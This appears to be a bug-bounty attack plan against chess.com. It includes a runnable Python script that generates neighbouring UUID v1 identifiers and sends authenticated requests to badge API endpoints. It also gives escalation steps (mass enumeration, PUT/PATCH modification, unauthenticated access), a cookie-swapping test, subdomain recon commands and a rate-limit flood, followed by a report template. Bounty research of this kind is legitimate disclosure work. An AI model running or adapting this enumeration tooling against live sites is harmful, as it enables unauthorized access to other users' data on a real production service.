# Strategy: chess.com POC

## Target Overview
- **Program**: chess.com on HackerOne (bounties up to $4000)
- **Scope**: `chess.com` domain only
- **Report to**: bounties{at}chesscom{dot}atlassian{dot}net
- **Policy**: https://www.chess.com/news/view/chess-com-bug-bounty-policy

## Priority Attack Vectors (ordered by likelihood of POC success)

---

## 1. UUID v1 IDOR on Badges / Profile Settings

### What was found
- Chess.com uses **UUID v1** (time-based) for badge IDs in profile settings
- UUID v1 embeds the **exact timestamp** of generation + **server MAC address**
- UUIDs generated close together are **numerically sequential → enumerable**
- 4 badge UUIDs collected (`saved uuids.txt`), all from July 2023, same time window
- Two different server nodes detected (`ad813d4cf413` vs `5309306aceef`)

### Step-by-step POC

#### Phase 1: Confirm UUID v1 in the wild
```python
import uuid
from datetime import datetime, timezone

u = uuid.UUID("abea117e-2af1-11ee-93f0-1f375626db21")
assert u.version == 1, "NOT v1!"
GREGORIAN_OFFSET = 0x01b21dd213814000
unix_ts = (u.time - GREGORIAN_OFFSET) / 1e7
dt = datetime.fromtimestamp(unix_ts, tz=timezone.utc)
print(f"Version: {u.version}, Node MAC: {uuid.getnode()}, Time: {dt}")
```

1. Go to `chess.com/settings/profile`
2. Open DevTools > Network tab
3. Click on a badge to select it
4. Find the API request containing the badge UUID
5. Copy the UUID and decode it with the script above to confirm it's v1

#### Phase 2: Map the endpoint
Intercept requests while interacting with badges:
- `GET /api/badge/{uuid}` — reading badge info
- `PUT/PATCH /api/badge/{uuid}` — assigning a badge
- `GET /api/user/{uuid}` — user profile
- `GET /api/profile/{uuid}` — profile settings

Use Burp Suite / ZAP to find the exact endpoint patterns.

#### Phase 3: Generate neighboring UUIDs
```python
import uuid, requests

def generate_nearby(target_uuid_str, delta_range=100, step=1):
    target = uuid.UUID(target_uuid_str)
    results = []
    for delta in range(-delta_range, delta_range + 1):
        new_time = target.time + (delta * step)
        if new_time < 0:
            continue
        new_uuid = uuid.UUID(
            fields=(
                new_time & 0xFFFFFFFF,
                (new_time >> 32) & 0xFFFF,
                (new_time >> 48) & 0x0FFF | 0x1000,
                target.clock_seq_hi_variant,
                target.clock_seq_low,
                target.node
            ), version=1
        )
        results.append(str(new_uuid))
    return results

# Use YOUR session cookie/token
cookies = {"session": "YOUR_SESSION_COOKIE_HERE"}
headers = {"User-Agent": "Mozilla/5.0"}

# Test a range of UUIDs around YOUR badge UUID
your_uuid = "abea117e-2af1-11ee-93f0-1f375626db21"
uuids = generate_nearby(your_uuid, delta_range=50)

for uid in uuids[:10]:  # start small
    url = f"https://chess.com/api/badge/{uid}"
    r = requests.get(url, cookies=cookies, headers=headers)
    print(f"[{r.status_code}] {uid}")
    if r.status_code == 200 and r.text != "":
        print(f"  HIT! -> {r.text[:200]}")
```

#### Phase 4: What confirms a valid IDOR
- **200 OK** with **different user data** (different username, email, settings) = POC confirmed
- **403 Forbidden** = resource exists but blocked (still evidence of broken access control)
- **401 vs 404** timing difference = user enumeration

#### Phase 5: Escalate
- Try PUT/PATCH on discovered UUIDs (modify badge assignments)
- Test without authentication token (unauthorized access)
- Try mass enumeration (1000+ UUIDs)

### Expected severity
- **$200-$400** (IDOR / Application Logic Bypass) — read others' badge data
- **Up to $800** (if PII like email leaked) — PII Leakage
- **Up to $800-$3000** (if mass user data accessible) — Mass Account Data Leakage

---

## 2. UUID v1 Server Info Leakage (no auth needed)

Even if the IDOR itself is patched, chess.com leaks:

1. **Server MAC address** in the UUID node field → infrastructure fingerprinting
2. **Exact generation timestamp** of resources → timeline recon
3. **Multiple server nodes** detectable → confirms horizontal scaling infrastructure

### POC
```python
uuids = [
    "abea117e-2af1-11ee-93f0-1f375626db21",
    "abea13cc-2af1-11ee-b8a8-0710e9c93295",
    "abea1624-2af1-11ee-b605-530cf2dfaa9a",
    "abea1872-2af1-11ee-9194-9b04a8f3be53",
]
for uid in uuids:
    u = uuid.UUID(uid)
    print(f"Node: {u.node:#014x} ({'-'.join(format(u.node>>8*(5-i),'02x') for i in range(6))})")
```

Report as **medium severity** — CWE-200 (Information Exposure) + CWE-330 (Insufficient Randomness).

---

## 3. Secure-CST Cookie Analysis

### What was flagged
- The `cst` cookie is described as a "SWR React Query Cache Key" or "Opaque token"
- If it's a **predictable cache key**, it could allow cache poisoning or data leakage

### Steps to test
1. Capture the `cst` cookie from an authenticated session
2. Decode it (base64? hex? JWT? check with `jwt.io`)
3. Log in from a different browser/device, compare `cst` values
4. Test if reusing another user's `cst` grants access to their data
5. Test if removing/modifying `cst` breaks caching for other users (cache poisoning)

### If it's a cache key:
```
GET /api/settings
Cookie: cst=abc123
```
Try changing to:
```
Cookie: cst=attacker_controlled
→ If response = another user's data → CRITICAL cache poisoning
```

---

## 4. Staging / Hidden Subdomain Recon

Use your existing recon approach:
- Subdomain fuzzing: `*.chess.com`
- Look for: `staging.chess.com`, `dev.chess.com`, `admin.chess.com`
- Staging environments often have weaker security + debug endpoints

### Check
```
nslookup staging.chess.com
nslookup admin.chess.com
nslookup cdn.chess.com
```

---

## 5. Rate Limiting on Badge Selection

### Test
1. Intercept the badge selection request
2. Send 100 rapid requests via Burp Intruder
3. If all succeed without captcha/block → **No Rate Limiting** ($100 bounty)

---

## Report Template

When you find a valid POC, structure your email as:

```
Subject: [chess.com] Security Vulnerability — UUID v1 IDOR / Info Leakage

Summary:
Chess.com uses UUID v1 (time-based) for badge/profile identifiers, which allows
enumeration of neighboring resources and leaks server infrastructure information.

Steps to Reproduce:
1. Create account at chess.com
2. Extract badge UUID from /settings/profile (DevTools > Network)
3. Run attached Python script to generate ±50 neighboring UUIDs
4. Send GET requests to /api/badge/{generated_uuid}
5. Observe: [describe your observation - 200 with different user data / 403 pattern / etc.]

Impact:
- IDOR: Access other users' badge/profile data
- Info leak: Server MAC + timestamps exposed
- [Add more based on findings]

Proof of Concept: [attach script + screenshots]

Tools used: Python 3 + requests, manual browser testing
CWE: CWE-284 / CWE-330 / CWE-200
Severity: [Medium/High/Critical]
```

---

## Quick Reference: Chess.com Bounty Payouts

| Bug Type | Max Bounty |
|----------|-----------|
| RCE | $4000 |
| Mass Data Leakage | $3000 |
| Account Takeover | $800 |
| IDOR / Logic Bypass | $400 |
| CSRF | $400 |
| SSRF / SSTI | $400 |
| XSS (new vector) | $250 |
| PII Leakage | $200 |
| Captcha Bypass | $150 |
| No Rate Limiting | $100 |
| Info Leakage | $100 |
